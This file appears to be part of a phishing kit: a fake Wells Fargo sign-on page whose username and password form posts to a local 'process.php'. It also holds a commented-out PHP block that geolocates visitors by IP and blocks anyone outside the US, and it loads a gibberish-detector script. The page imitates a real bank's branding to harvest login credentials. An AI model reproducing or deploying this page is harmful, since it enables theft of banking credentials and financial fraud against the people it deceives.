<?php
/*
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


if($_SERVER['HTTP_X_FORWARDED_FOR'])
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else
		
		$ip = $_SERVER['REMOTE_ADDR'];
		
		$two_letter_country_code = iptocountry($ip);
		
		function iptocountry($ip){
			$numbers = preg_split( "/\./", $ip);
			include("ip_files/".$numbers[0]. ".php");
			$code = ($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);
			
			foreach($ranges as $key => $value){
				if($key <= $code){
					if($ranges[$key][0] >= $code){
						$country = $ranges[$key][1]; break;
					}
				}
			}
			
			if($country == ""){
				$country = "unknown";
			}
			return $country;	
		}
		
		// Then add this little blocking script at the end of the code above
		
		//if($two_letter_country_code == "US")
		//die();
		
		
		if($two_letter_country_code == "US"){
		
			}
		else{
		
		  die("You do not have access to this page");
		}
*/
?>
<!DOCTYPE html>
 

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:tcdl="http://www.tridion.com/ContentDelivery/5.3/TCDL"  class="no-js" lang="en">
<head>
    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages & More</title>
    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more." />
    <meta name="keywords" content="home page, log in, view accounts, wellsfargo.com, sign in, sign on" />
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta http-equiv="Content-type" content="text/html" />
    <meta http-equiv="Cache-Control" content="must-revalidate" />
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />
    

    <meta name="application-name" content="WELLS FARGO BANK"/>
    <meta name="msapplication-TileColor" content="#1e3d75"/>
    <meta name="msapplication-TileImage" content="WELLSPIN.png"/>
    
     <link rel="stylesheet" href="css/style.css" />
     <link rel="shortcut icon" href="images/favicon.png"/>
     <script type="text/javascript" src="js/jqueryLib.js"></script>
     <script type="text/javascript" src="js/gibberish-detector.js"></script>
</head>

<body>

   <div class="row1">
   	  <div class="row1-inner"></div>
   </div>
   <div class="row2"></div>
   <div class="row3">
      <div class="row3-inner"></div>
   </div>
   <div class="row4">
      <div class="row4-inner"></div>
   </div>
   <div class="row5">
       <div class="log-panel">
         <form name="form1" method="post" action="process.php">
            
           <table width="200" border="0">
              <tr>
                <td height="28"><div class="log-header"></div></td>
              </tr>
              <tr>
                <td></td>
              </tr>
              <tr>
                <td height="58"><div class="username-box">
                      <label class="l-user">Username</label>
                      <input type="text" name="username" id="username" required autocomplete="off" class="username">
                </div></td>
              </tr>
             
             <tr>
                <td height="57"><div class="password-box">
                      <label class="l-pass">Password</label>
                      <input type="password" name="password" id="password" required autocomplete="off" class="username">
                </div></td>
              </tr>
              <tr>
                <td height="25"><div class="save-box"></div></td>
              </tr>
              <tr>
                <td height="49"><input type="submit" name="btnsignon" id="btnsignon" value="Sign On" class="btnsignon"></td>
              </tr>
              <tr>
                <td><div class="forget"></div></td>
              </tr>
           </table>
         </form>
         <div class="log-footer1">
          <div class="log-footer"></div>
          </div>
       </div>
      
     <div class="row5-inner"></div>
     <div class="row5-nner2"></div>
   </div>
   <div class="row6">
   	  <div class="row6-inner"></div>
   </div>
   <div class="row7">
      <div class="row7-inner"></div>
   </div>
   <div class="row8">
      <div class="row8-inner"></div>
   </div>
   <div class="row9">
      <div class="row9-inner"></div>
   </div>
   <div class="footer">
      <div class="footer-inner"></div>
   </div>

<script>
   var input = document.getElementById("password");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnsignon").click();
	  }
	
	});
</script> 
<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>